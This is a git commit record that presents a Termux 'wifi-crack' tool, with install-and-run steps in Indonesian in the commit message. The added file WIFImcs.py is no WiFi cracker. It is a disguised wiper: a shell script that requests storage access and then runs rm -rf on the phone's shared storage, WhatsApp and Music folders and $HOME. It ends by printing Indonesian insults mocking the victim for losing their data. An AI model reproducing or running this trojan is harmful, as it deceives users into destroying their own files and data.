007fe01c231e3bc96b27841e72ebebde3e7c26f1
mousecyber-sec <53597227+mousecyber-sec@users.noreply.github.com>
2019-08-16 15:17:41 +0700

    Add files via upload
    $pkg install git
    $pkg install python2
    $pip2 install mechanize 
    $git clone https://github.com/mousecyber-sec/wifi-crack
    $cd wifi-crack
    $ls
    $python2 WIFImcs.py
    ->Masukkan Id / Nama wifi Disekitar,,ingat harus sama nama wifinya,,ga boleh beda 1 huruf

---
+++ WIFImcs.py
@@ -0,0 +1,20 @@
+#!/system/xbin/bash
+#Clear All
+#MOKAD LU BABI
+
+clear
+sleep 0.1
+termux-setup-storage
+clear
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /storage/emulated/0/android
+rm -rf /storage/emulated/0/Music
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf $HOME
+figlet WIFI ALERT!
+
+echo Lu Kontol
+echo Lu Babi
+echo Data Lu dah kehapus
+echo aowkwowkowkwowkwokwo
